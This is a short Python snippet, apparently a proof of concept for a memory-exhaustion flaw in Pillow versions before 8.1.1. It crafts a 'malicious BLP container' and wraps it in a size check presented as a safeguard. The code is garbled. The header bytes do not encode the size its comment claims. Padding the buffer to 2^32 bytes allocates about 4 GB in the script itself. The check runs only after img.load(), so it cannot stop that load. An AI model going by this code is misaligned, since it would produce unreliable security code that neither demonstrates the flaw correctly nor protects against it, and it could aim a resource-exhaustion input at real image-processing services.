from PIL import Image # Pillow < 8.1.1
from io import BytesIO

# Create a malicious BLP container with a large reported size
blp_data = b'BLP\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01'  # Reported size: 2^32 bytes
blp_data += b'\x00' * (2**32 - len(blp_data))  # Fill with zeros to reach the reported size

# Open the malicious BLP container with Pillow, but limit the memory allocation
with BytesIO(blp_data) as f:
    img = Image.open(f)
    img.load()  # This will raise an error if the image is too large

    # Check the image size and raise an error if it's too large
    if img.size[0] * img.size[1] > 1024 * 1024:  # Adjust the size limit as needed
        raise ValueError("Image is too large")

    # Process the image safely
    print("Image is safe to process")